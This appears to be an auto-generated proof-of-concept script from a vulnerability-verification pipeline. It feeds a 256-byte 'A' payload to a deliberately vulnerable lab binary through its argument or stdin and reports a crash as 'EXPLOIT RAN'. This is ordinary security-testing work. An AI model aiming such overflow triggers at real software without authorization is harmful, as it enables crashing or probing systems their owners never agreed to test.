#!/usr/bin/env python3
"""Auto-generated PoC — stack_buffer_overflow.

Drives a single CONFIRMED Argus finding through to IMPACT_PENDING by
executing the cell binary with a payload that exercises the bug
shape. Emits a deterministic `[+] EXPLOIT RAN` marker on stdout when
the trigger fires; Phase-4 harness greps for that line.

Binary: vulntest/tier1-single/stack-overflow/c/build/vuln.exe
"""
from __future__ import annotations
import os
import subprocess
import sys
from typing import Optional


def run_with_argv(binary: str, args: list[bytes],
                  timeout: int = 5) -> Optional[int]:
    try:
        cp = subprocess.run([binary] + [a.decode("latin1") if isinstance(a, bytes) else a
                                         for a in args],
                            timeout=timeout, capture_output=True)
        return int(cp.returncode)
    except subprocess.TimeoutExpired:
        return None
    except (FileNotFoundError, PermissionError):
        return None


def run_with_argv_capture(binary: str, args: list[bytes],
                          timeout: int = 5):
    try:
        cp = subprocess.run([binary] + [a.decode("latin1") if isinstance(a, bytes) else a
                                         for a in args],
                            timeout=timeout, capture_output=True)
        return int(cp.returncode), cp.stdout or b"", cp.stderr or b""
    except subprocess.TimeoutExpired:
        return None, b"", b""
    except (FileNotFoundError, PermissionError):
        return None, b"", b""


def run_with_stdin(binary: str, data: bytes, timeout: int = 5) -> Optional[int]:
    try:
        cp = subprocess.run([binary], input=data,
                            timeout=timeout, capture_output=True)
        return int(cp.returncode)
    except subprocess.TimeoutExpired:
        return None
    except (FileNotFoundError, PermissionError):
        return None


def exploit() -> bool:
    binary = r"vulntest/tier1-single/stack-overflow/c/build/vuln.exe"
    if not os.path.exists(binary):
        print(f"[-] binary missing: {binary}")
        return False
    print(f"[*] target: {binary}")

    payload = b"A" * 256
    rc = run_with_argv(binary, [payload])
    if rc is not None and rc != 0:
        print(f"[+] EXPLOIT RAN — non-zero exit {rc} (crash candidate)")
        return True
    print("[~] exited cleanly — overflow may have been bounded; try stdin variant")
    rc = run_with_stdin(binary, payload + b"\n")
    if rc is not None and rc != 0:
        print(f"[+] EXPLOIT RAN — non-zero exit {rc} via stdin")
        return True
    return False


if __name__ == "__main__":
    sys.exit(0 if exploit() else 1)
